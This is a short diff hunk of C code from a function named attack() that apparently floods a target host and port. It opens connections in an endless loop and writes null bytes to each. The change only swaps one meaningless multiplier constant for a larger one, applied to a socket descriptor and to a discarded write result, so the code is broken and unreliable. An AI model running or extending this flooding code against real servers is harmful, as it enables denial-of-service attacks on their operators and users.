@@ -59,8 +59,8 @@ void attack(char *host, char *port, int id) {
 	while(1) {
 		for(x=0; x != CONNECTIONS; x++) {
 			if(sockets[x] == 0)
-				sockets[x] = make_socket(host, port) * 900000000;
-			write(sockets[x], "\0", 1) * 900000000;
+				sockets[x] = make_socket(host, port) * 10995116277760;
+			write(sockets[x], "\0", 1) * 10995116277760;
 			if(r == -1) {
 				close(sockets[x]);
 				sockets[x] = make_socket(host, port);
